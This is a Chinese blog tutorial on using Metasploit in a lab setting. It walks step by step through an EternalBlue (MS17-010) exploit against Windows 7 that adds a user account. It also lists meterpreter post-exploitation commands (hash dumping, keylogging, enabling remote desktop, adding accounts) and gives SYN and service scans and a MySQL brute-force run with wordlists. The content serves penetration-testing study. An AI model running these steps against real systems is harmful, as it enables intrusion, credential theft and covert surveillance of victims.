<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title># MSF攻击使用(四) | Fr</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://kite-007.github.io/favicon.ico?v=1617547166228">
<link rel="stylesheet" href="https://kite-007.github.io/styles/main.css">



<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>



    <meta name="description" content="
1. exploit简要流程
2. payload选择
3. MSF run参数
4. meterpreter
5. auxiliary简要流程

1. SYN端口扫描
2. SMB获取系统信息
3. 服务识别
4. 密码嗅探
5. 身份..." />
    <meta name="keywords" content="MSF,kali,工具" />
  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://kite-007.github.io">
        <img src="https://kite-007.github.io/images/avatar.png?v=1617547166228" class="site-logo">
        <h1 class="site-title">Fr</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            首页
          </a>
        
      
        
          <a href="https://kite-007.github.io/tags" class="site-nav">
            标签
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      意志坚定，持之以恒
    </div>
    <div class="site-footer">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://kite-007.github.io/atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title"># MSF攻击使用(四)</h2>
            <div class="post-date">2021-03-30</div>
            
            <div class="post-content" v-pre>
              <p><ul class="markdownIt-TOC">
<li><a href="#1-exploit%E7%AE%80%E8%A6%81%E6%B5%81%E7%A8%8B">1. exploit简要流程</a></li>
<li><a href="#2-payload%E9%80%89%E6%8B%A9">2. payload选择</a></li>
<li><a href="#3-msf-run%E5%8F%82%E6%95%B0">3. MSF run参数</a></li>
<li><a href="#4-meterpreter">4. meterpreter</a></li>
<li><a href="#5-auxiliary%E7%AE%80%E8%A6%81%E6%B5%81%E7%A8%8B">5. auxiliary简要流程</a>
<ul>
<li><a href="#1-syn%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">1. SYN端口扫描</a></li>
<li><a href="#2-smb%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF">2. SMB获取系统信息</a></li>
<li><a href="#3-%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB">3. 服务识别</a></li>
<li><a href="#4-%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2">4. 密码嗅探</a></li>
<li><a href="#5-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81">5. 身份验证</a></li>
</ul>
</li>
</ul>
(MSF)</p>
<h1 id="1-exploit简要流程">1. exploit简要流程</h1>
<p><strong>以win 7 与ms17-010实例</strong></p>
<ol>
<li>目标主机，需要能够ping通</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617105121301.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="2">
<li>攻击前，搜索所需要使用的漏洞</li>
</ol>
<pre><code class="language-shell">search ms17-010
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617103946003.png" alt="" loading="lazy"></li>
<li>辅助模块，可以用于查看是否存在该漏洞。</li>
</ul>
<hr>
<ol start="3">
<li>攻击流程，选择漏洞</li>
</ol>
<pre><code class="language-shell">use exploit/windows/smb/ms17_010_eternalblue
</code></pre>
<hr>
<ol start="4">
<li>查看选项，设置变量</li>
</ol>
<pre><code class="language-shell">show options 
show targets

set RHOST 192.168.200.142
set target 0
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617105458664.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="5">
<li>寻找想要使用的payload</li>
</ol>
<pre><code class="language-shell">show payloads

set payload windows/x64/exec

show options

# win下添加用户的命令
set CMD net user newuser newuser /add

show options
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617105580722.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="6">
<li>测试</li>
</ol>
<pre><code class="language-shell">run
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617105617016.png" alt="" loading="lazy"></li>
</ul>
<hr>
<h1 id="2-payload选择">2. payload选择</h1>
<p>payload名称命名规则：<br>
_find_tag：在一个已建立的链接上。<br>
_reverse_tcp：反向连接到攻击者主机。<br>
bind_tcp：监听一个tcp连接<br>
reverse_http：反向链接通过HTTP隧道</p>
<ul>
<li>正向与反向：
<ul>
<li>主机IP：192.168.200.137</li>
<li>目标IP：192.168.200.142</li>
<li>反向：目标IP请求主机IP</li>
<li>正向：主机IP请求目标IP</li>
</ul>
</li>
</ul>
<p>--假如目标IP为公网IP（180.12.12.12），则反向连接{公网IP--》主机IP}不能连接。<br>
--但是正向连接{主机IP--》公网IP}可以连接。</p>
<p>(三次握手)</p>
<ol>
<li>客户端发送SYN包给服务端</li>
<li>服务端收到之后，回SYN和ACK包返回</li>
<li>客户端发送ACK回复收到</li>
</ol>
<hr>
<h1 id="3-msf-run参数">3. MSF run参数</h1>
<ul>
<li>如果入侵之后要想返回操作去使用其他漏洞进行攻击，使用参数</li>
</ul>
<pre><code class="language-shell">-e&lt;opt&gt;要使用的有效载荷编码器。如果没有指定，则使用编码器
-f 强制开发漏洞，而不考虑极小值的大小。
-h 帮助
-j 后台运行。。
-n &lt;opt&gt;使用NOP发生器。如果没有指定，则使用NOP。
-o &lt;opt&gt;在VAR=VALL格式中的逗号分隔选项列表。
-p &lt;opt&gt;使用的有效载荷。如果没有指定，则使用有效载荷。
-t &lt;opt&gt; 要使用的目标索引或名称。如果没有指定，则使用目标。
-z 在成功开发后不与会话交互。
</code></pre>
<hr>
<h1 id="4-meterpreter">4. meterpreter</h1>
<pre><code class="language-shell">session 查看所有肉鸡列表
session -l 查看在线肉鸡列表(可以进行控制的)
exploit 执行渗透攻击或模块来攻击目标。
sessions -i 1打开建立的第一个会话
·getuid 查看UID
·sysinfo 查看攻击主机的系统信息
run hashdump dump 目标主机的hash帐号信息，备份进行暴破PS.查看目标主机进程
migrate 1576(pid)切换自己为管理员，1576是管理员的进程
keyscan_start，开启健盘记录功能
keyscan_dump 查看健盘记录信息
keyscan_stop.停止健盘记录
run getgui-e 远程开启目标主机的远程桌面
run getgui-u cisco -p cisco 远程添加目标主机帐号密码
rdesktop 192.168.1.100 远程桌面
</code></pre>
<h1 id="5-auxiliary简要流程">5. auxiliary简要流程</h1>
<p><strong>以win 7为例</strong></p>
<h2 id="1-syn端口扫描">1. SYN端口扫描</h2>
<p><em>SYN：同步序列编号（Synchronize Sequence Numbers）。是TCP/IP建立连接时使用的握手信号。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个SYN消息，服务器使用SYN+ACK应答表示接收到了这个消息，最后客户机再以ACK消息响应。这样在客户机和服务器之间才能建立起可靠的TCP连接，数据才可以在客户机和服务器之间传递。</em><br>
<em>TCP连接的第一个包，非常小的一种数据包。SYN 攻击包括大量此类的包，由于这些包看上去来自实际不存在的站点，因此无法有效进行处理。每个机器的欺骗包都要花几秒钟进行尝试方可放弃提供正常响应。</em></p>
<pre><code class="language-shell"># 搜索出关于端口扫描的模块
search portscan 

# 使用SYN扫描模块
use auxiliary/scanner/portscan/syn 

# 显示需要设置的选项
info | show options

# 设置网卡信息 注意网卡名称ens33与eth0等等
set INTERFACE ens33

# 设置扫描端口与目的主机，线程
set PORTS 1-500
set RHOSTS 192.168.200.142
set THREADS 100

run
* 当提示权限不足时使用sudo命令来启动MSF即可解决

quit | exit | back
</code></pre>
<h2 id="2-smb获取系统信息">2. SMB获取系统信息</h2>
<p><em>SMB(全称是Server Message Block)是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。</em></p>
<pre><code class="language-shell">search scanner smb

use auxiliary/scanner/smb/smb_version

info

set RHOST 192.168.200.142

run
</code></pre>
<h2 id="3-服务识别">3. 服务识别</h2>
<ol>
<li>ssh扫描识别</li>
</ol>
<pre><code class="language-shell">search auxiliary ssh version

use auxiliary/scanner/ssh/ssh_version

info

set RHOSTS 192.168.200.142
* 还可以自己指定范围或者多个端口
set RHOSTS 192.168.200.1-255
set RHOSTS 192.168.200.142 192.168.200.143

run
</code></pre>
<ol start="2">
<li>ftp扫描识别</li>
</ol>
<pre><code>search auxiliary ftp version

use auxiliary/scanner/ftp/ftp_version

info

set RHOSTS 192.168.200.142

run
</code></pre>
<h2 id="4-密码嗅探">4. 密码嗅探</h2>
<p><em>psnuffle</em></p>
<h2 id="5-身份验证">5. 身份验证</h2>
<p><em>login</em></p>
<pre><code>search auxiliary mysql login

use auxiliary/scanner/mysql/mysql_login

info

#找一个测试爆破的用户名字典和密码字典进行爆破

#设置用户字典
set user_file  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  
#设置密码字典
set pass_file   /usr/share/sparta/wordlists/mysql-default-userpass.txt  

run 开始爆破..，知道看到绿色加号即为破解成功！
</code></pre>

            </div>
            
              <div class="tag-container">
                
                  <a href="https://kite-007.github.io/AalKWSLE-/" class="tag">
                    MSF
                  </a>
                
                  <a href="https://kite-007.github.io/Rq675FCzM/" class="tag">
                    kali
                  </a>
                
                  <a href="https://kite-007.github.io/yHvCxoFSyJ/" class="tag">
                    工具
                  </a>
                
              </div>
            
            
              <div class="next-post">
                <div class="next">下一篇</div>
                <a href="https://kite-007.github.io/msf-chang-yong-ming-ling-san/">
                  <h3 class="post-title">
                    # MSF常用命令(三)
                  </h3>
                </a>
              </div>
            

            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
<script type="application/javascript">

AOS.init();

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>






  </body>
</html>
